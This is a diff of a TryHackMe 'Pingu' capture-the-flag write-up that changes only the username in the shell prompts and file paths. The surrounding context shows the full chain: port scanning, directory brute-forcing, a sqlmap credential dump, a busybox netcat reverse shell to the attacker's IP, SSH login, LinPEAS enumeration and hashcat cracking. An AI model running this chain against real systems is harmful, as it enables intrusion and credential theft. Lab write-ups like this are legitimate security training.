@@ -17,7 +17,7 @@ Note: This room expects some basic pen testing knowledge, as I will not be going
 We use [Rustscan](../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Pingu]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Pingu]
 └─$ rustscan -a 10.10.110.207 -- -A 
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
 | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
@@ -30,7 +30,7 @@ ________________________________________
  --------------------------------------
 RustScan: Where '404 Not Found' meets '200 OK'.
 
-[~] The config file is expected to be at "/home/hax/.rustscan.toml"
+[~] The config file is expected to be at "/home/mdn0x/.rustscan.toml"
 [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
 [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
 Open 10.10.110.207:22
@@ -59,7 +59,7 @@ PORT   STATE SERVICE REASON         VERSION
 We use [Gobuster](../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) to find hidden files :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Pingu]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Pingu]
 └─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -x php,html,txt -u http://10.10.110.207 
 
 /.htaccess            (Status: 403) [Size: 278]
@@ -101,7 +101,7 @@ Useful Flags:
 Let's do it :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Pingu]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Pingu]
 └─$ sqlmap -u http://10.10.110.207/administrator.php --forms --dump
 
 do you want to exploit this SQL injection? [Y/n] Y
@@ -131,8 +131,8 @@ Table: users
 | secretpass | pingudad |
 +------------+----------+
 
-[21:48:27] [INFO] table 'users.users' dumped to CSV file '/home/hax/.local/share/sqlmap/output/10.10.110.207/dump/users/users.csv'
-[21:48:27] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/hax/.local/share/sqlmap/output/results-07222025_0948pm.csv'                                                                                                                                        
+[21:48:27] [INFO] table 'users.users' dumped to CSV file '/home/mdn0x/.local/share/sqlmap/output/10.10.110.207/dump/users/users.csv'
+[21:48:27] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/mdn0x/.local/share/sqlmap/output/results-07222025_0948pm.csv'                                                                                                                                        
 
 [*] ending @ 21:48:27 /2025-07-22/
 ```
@@ -152,7 +152,7 @@ busybox nc 10.8.162.183 1337 -e sh             'https://www.revshells.com/'
 ```
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Pingu]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Pingu]
 └─$ nc -lvnp 1337             
 listening on [any] 1337 ...
 connect to [10.8.162.183] from (UNKNOWN) [10.10.144.132] 33006
@@ -198,7 +198,7 @@ pingu
 Now we have [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md) access on the machine :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Pingu]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Pingu]
 └─$ ssh  pingu@10.10.144.132                      
 The authenticity of host '10.10.144.132 (10.10.144.132)' can't be established.
 ED25519 key fingerprint is SHA256:+hK0Xg1iyvZJUoO07v4g1UZ11QpuwY05deZS4BPEbbE.
@@ -247,7 +247,7 @@ pingu@ubuntu:/home/papa$
 Let's copy  [LinPEAS](../../3%20-%20Tags/Hacking%20Tools/LinPEAS.md) via scp ([SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md)) and it will search for [Privilege Escalation](../../3%20-%20Tags/Hacking%20Concepts/Privilege%20Escalation.md) vectors on the target :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Pingu]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Pingu]
 └─$ scp /usr/share/peass/linpeas/linpeas.sh  pingu@10.10.144.132:/tmp
 pingu@10.10.144.132's password: 
 linpeas.sh                                                                                  100%  932KB 447.3KB/s   00:02 
@@ -280,7 +280,7 @@ Now that we have the password hashes, we can crack them and get the root passwor
 We can use [Hashcat](../../3%20-%20Tags/Hacking%20Tools/Hashcat.md) to crack the hash :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Pingu]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Pingu]
 └─$ hashcat -a 3 -m 1400 /usr/share/wordlists/rockyou.txt
 
 'love2fish'
